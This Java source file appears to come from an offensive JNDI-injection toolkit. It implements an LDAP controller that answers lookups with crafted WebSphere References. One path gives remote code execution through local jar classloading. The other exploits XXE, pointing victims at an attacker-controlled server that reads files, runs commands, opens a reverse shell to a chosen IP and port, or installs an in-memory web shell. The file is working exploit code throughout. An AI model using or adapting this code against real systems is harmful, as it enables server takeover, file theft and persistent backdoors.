package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.PayloadType;
import com.qi4l.JYso.enumtypes.WebsphereActionType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedActionTypeException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.util.Properties;

import static org.fusesource.jansi.Ansi.ansi;

/*
 * Requires:
 * - websphere v6-9 libraries in the classpath
 */

@LdapMapping(uri = {"/websphere"})
public class WebsphereController implements LdapController {
    private WebsphereActionType actionType;
    private String              localJarPath;
    private String              injectUrl;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base));

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        Reference ref;
        if (actionType == WebsphereActionType.rce) {
            //prepare a payload that leverages arbitrary local classloading in com.ibm.ws.client.applicationclient.ClientJMSFactory
            ref = new Reference("ExportObject",
                    "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory", null);
            Properties refProps = new Properties();
            refProps.put("com.ibm.ws.client.classpath", localJarPath);
            refProps.put("com.ibm.ws.client.classname", "xExportObject");
//            ref.add(new com.ibm.websphere.client.factory.jdbc.PropertiesRefAddrropertiesRefAddr("JMSProperties", refProps));

        } else {
            //prepare payload that exploits XXE in com.ibm.ws.webservices.engine.client.ServiceFactory
            ref = new Reference("ExploitObject",
                    "com.ibm.ws.webservices.engine.client.ServiceFactory", null);
            ref.add(new StringRefAddr("WSDL location", injectUrl));
            ref.add(new StringRefAddr("service namespace", "xxx"));
            ref.add(new StringRefAddr("service local part", "yyy"));
        }
        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedActionTypeException {
        try {
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                actionType = WebsphereActionType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ActionType >> |@" + actionType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedActionTypeException("UnSupportedActionType >> " + base.substring(firstIndex + 1, secondIndex));
            }

            switch (actionType) {
                case list:
                    String file = base.substring(base.lastIndexOf("=") + 1);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Read File/List Directory >> |@" + file));
                    injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/list.wsdl?file=" + file;
                    break;
                case rce:
                    String localJarFile = base.substring(base.lastIndexOf("=") + 1);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Local jar path >> |@" + localJarFile));
                    localJarPath = localJarFile;
                    break;
                case upload:
                    int thirdIndex = base.indexOf("/", secondIndex + 1);
                    if (thirdIndex < 0) thirdIndex = base.length();

                    PayloadType payloadType;
                    try {
                        payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                        // webspherebypass 只支持这 4 种类型的 PayloadType
                        if (payloadType != PayloadType.command && payloadType != PayloadType.dnslog
                                && payloadType != PayloadType.reverseshell && payloadType != PayloadType.webspherememshell) {
                            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + payloadType);
                        }
                    } catch (IllegalArgumentException e) {
                        throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                    }

                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA PayloadType >> |@" + payloadType));
                    switch (payloadType) {
                        case command:
                            String cmd = Util.getCmdFromBase(base);
                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                            injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=command&cmd=" + cmd;
                            break;
                        case dnslog:
                            String url = base.substring(base.lastIndexOf("/") + 1);
                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                            injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=dnslog&url=" + url;
                            break;
                        case reverseshell:
                            String[] results = Util.getIPAndPortFromBase(base);
                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA IP >> |@" + results[0]));
                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Port >> |@" + results[1]));
                            injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=reverseshell&ip=" + results[0] + "&port=" + results[1];
                            break;
                        case webspherememshell:
                            injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=webspherememshell";
                            break;
                    }
                    break;
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            if (e instanceof UnSupportedActionTypeException) throw (UnSupportedActionTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}